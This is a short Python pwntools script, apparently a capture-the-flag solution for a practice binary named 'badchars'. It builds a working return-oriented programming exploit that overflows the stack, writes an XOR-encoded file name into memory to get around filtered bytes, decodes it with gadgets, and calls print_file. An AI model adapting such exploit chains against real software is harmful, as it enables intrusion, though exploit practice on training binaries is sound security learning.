from pwn import *

elf = ELF("./attachment/badchars")
rop = ROP(elf)

io = process(elf.path, cwd="./attachment", level="DEBUG")
bss_address = 0x00601038

XOR_VALUE = 2


def xor(b: bytes):
    return bytes([c ^ XOR_VALUE for c in b])


io.recv()
payload = b"A" * 40
payload += p64(0x000000000040069c)  # pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
payload += xor(b"flag.txt")
payload += p64(bss_address)
payload += p64(0)
payload += p64(0)
payload += p64(0x0000000000400634)  # mov qword ptr [r13], r12 ; ret

for i in range(8):
    payload += p64(0x00000000004006a0)  # pop r14 ; pop r15 ; ret
    payload += p64(XOR_VALUE)
    payload += p64(bss_address + i)
    payload += p64(0x0000000000400628)  # xor byte ptr [r15], r14b ; ret

payload += p64(0x00000000004006a3)  # pop rdi ; ret
payload += p64(bss_address)
payload += p64(rop.ret.address)
payload += p64(0x0000000000400510)  # print_file@plt
io.sendline(payload)
io.recvall()